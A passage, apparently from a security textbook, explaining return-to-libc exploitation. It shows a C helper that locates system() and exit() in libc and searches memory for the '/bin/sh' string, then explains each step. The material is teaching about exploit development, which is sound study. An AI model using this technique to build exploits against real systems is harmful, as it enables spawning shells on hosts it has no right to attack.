```
else {
    printf("Can't find /bin/sh in libc, use env instead...\n");
    exit(1);
}
}

int main(int argc, char **argv) {
    void *handle;
    int *sysaddr, *exitaddr;
    long shell;
    char exam[512];
    char *args[3];
    char *envs[1];
    long *lp;

    ① handle=dlopen(NULL,RTLD_LOCAL);

    *(void **)(&sysaddr)=dlsym(handle,"system");
    sysaddr+=4096; // using pointer math 4096*4=16384=0x4000=base address
    printf("system() found at %08x\n",sysaddr);

    *(void **)(&exitaddr)=dlsym(handle,"exit");
    exitaddr+=4096; // using pointer math 4096*4=16384=0x4000=base address
    printf("exit() found at %08x\n",exitaddr);

    // Now search for /bin/sh using Solar Designer's approach
    if (setjmp(env))
        step=1;
    else
        step=-1;
    shell=(int)sysaddr;
    signal(SIGSEGV,fault);
    do
        ② while (memcmp((void *)shell, "/bin/sh", 8)) shell+=step;
    //check for null byte
    ③while (!(shell & 0xff) || !(shell & 0xff00) || !(shell & 0xff0000)
        || !(shell & 0xff000000));
    printf("\\"\\/bin\\/sh\\" found at %08x\n",shell+16384); // 16384=0x4000=base addr
}
```

The preceding program uses the dlopen() and dlsym() functions ① to handle objects and symbols located in the binary. Once the system() function is located, the memory is searched in both directions ②, looking for the existence of the "/bin/sh" string. The "/bin/sh" string can be found embedded in glibc and keeps the attacker in this case from depending on access to environment variables to complete the attack. Finally, the value is checked ③ to see if it contains a NULL byte and then the location is printed. You may customize the preceding program to look for other objects and strings. Let's compile the preceding program and test-drive it: